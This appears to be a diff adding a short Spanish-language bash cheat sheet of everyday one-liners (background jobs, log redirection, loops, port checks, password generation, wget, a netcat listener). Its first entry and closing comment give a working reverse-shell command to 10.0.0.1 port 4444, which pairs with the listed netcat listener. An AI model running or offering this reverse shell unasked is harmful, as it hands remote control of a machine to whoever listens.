@@ -1,0 +1,30 @@
+▶ Reverse Shell (Conexión remota):
+  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+▶ Ejecutar Comando en Segundo Plano (Ejecución desatendida):
+  nohup comando &
+
+▶ Redirigir Salida y Error (Capturar logs):
+  comando > salida.log 2>&1
+
+▶ Bucle For (Iterar rango):
+  for i in {1..10}; do echo $i; done
+
+▶ Comprobar Puerto Abierto (Test de conexión):
+  (echo >/dev/tcp/localhost/80) &>/dev/null && echo "Puerto 80 abierto" || echo "Puerto 80 cerrado"
+
+▶ Generar Contraseña Aleatoria (Crear clave):
+  openssl rand -base64 12
+
+▶ Monitorear Cambios en Directorio (Vigilancia en tiempo real):
+  while true; do clear; ls -lR; sleep 1; done
+
+▶ Descargar Archivo (Usar wget):
+  wget http://example.com/file.txt -O file.txt
+
+▶ Escuchar Puerto con Netcat (Esperar conexión):
+  nc -l 4444
+
+# Ejemplo de uso:
+# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+# Este comando abre una shell inversa conectándose a 10.0.0.1 en el puerto 4444.
